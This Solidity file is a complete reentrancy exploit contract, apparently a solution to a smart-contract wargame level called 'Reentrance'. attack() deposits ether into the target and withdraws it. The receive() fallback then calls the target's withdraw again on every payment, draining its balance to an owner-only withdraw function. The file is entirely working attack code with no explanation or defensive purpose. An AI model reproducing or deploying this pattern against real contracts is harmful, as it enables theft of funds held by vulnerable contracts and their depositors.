// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
    function balances(address) external view returns (uint256);
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract Donatexploit {
    address payable public owner;
    address public target;

    bool private _reenter = true;
    uint256 private _amount;

    constructor(address _target) public {
        owner = payable(msg.sender);
        target = _target;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() public payable onlyOwner {
        Reentrance reentr = Reentrance(payable(target));
        reentr.donate{value: msg.value}(address(this));
        _amount = reentr.balanceOf(address(this));
        reentr.withdraw(_amount);
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        (bool _,) = target.call(abi.encodeWithSignature("withdraw(uint256)", _amount));
    }
}
